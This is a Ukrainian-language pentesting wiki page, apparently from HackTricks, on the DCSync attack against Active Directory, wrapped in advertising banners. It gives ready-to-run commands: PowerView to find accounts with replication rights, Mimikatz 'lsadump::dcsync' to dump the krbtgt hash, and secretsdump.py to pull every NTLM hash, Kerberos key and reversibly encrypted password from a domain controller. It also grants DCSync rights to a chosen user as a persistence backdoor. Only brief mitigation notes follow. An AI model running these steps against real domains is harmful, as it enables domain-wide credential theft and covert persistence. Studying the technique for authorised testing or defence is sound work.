# DCSync

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Використовуйте [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync), щоб легко створювати та **автоматизувати робочі процеси**, що працюють на основі **найсучасніших** інструментів спільноти.\
Отримайте доступ сьогодні:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Дозвіл **DCSync** передбачає наявність цих дозволів над самим доменом: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** та **Replicating Directory Changes In Filtered Set**.

**Важливі примітки про DCSync:**

- **Атака DCSync імітує поведінку контролера домену та запитує інші контролери домену на реплікацію інформації** за допомогою віддаленого протоколу служби реплікації каталогу (MS-DRSR). Оскільки MS-DRSR є дійсною та необхідною функцією Active Directory, його не можна вимкнути або деактивувати.
- За замовчуванням лише групи **Domain Admins, Enterprise Admins, Administrators та Domain Controllers** мають необхідні привілеї.
- Якщо паролі будь-яких облікових записів зберігаються з оборотним шифруванням, в Mimikatz доступна опція для повернення пароля у відкритому тексті.

### Enumeration

Перевірте, хто має ці дозволи, використовуючи `powerview`:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Експлуатація локально
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Експлуатація віддалено
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` генерує 3 файли:

- один з **NTLM хешами**
- один з **Kerberos ключами**
- один з паролями у відкритому вигляді з NTDS для будь-яких облікових записів, для яких увімкнено [**зворотне шифрування**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Ви можете отримати користувачів зі зворотним шифруванням за допомогою

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Постійність

Якщо ви є адміністратором домену, ви можете надати ці дозволи будь-якому користувачу за допомогою `powerview`:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Тоді ви можете **перевірити, чи правильно були призначені** 3 привілеї, шукаючи їх у виході (ви повинні бачити назви привілеїв у полі "ObjectType"):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Пом'якшення

- Security Event ID 4662 (Політика аудиту для об'єкта повинна бути увімкнена) – Операція була виконана над об'єктом
- Security Event ID 5136 (Політика аудиту для об'єкта повинна бути увімкнена) – Об'єкт служби каталогів був змінений
- Security Event ID 4670 (Політика аудиту для об'єкта повинна бути увімкнена) – Дозволи на об'єкт були змінені
- AD ACL Scanner - Створюйте та порівнюйте звіти про ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Посилання

- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Використовуйте [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) для легкого створення та **автоматизації робочих процесів**, підтримуваних **найсучаснішими** інструментами спільноти.\
Отримайте доступ сьогодні:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}
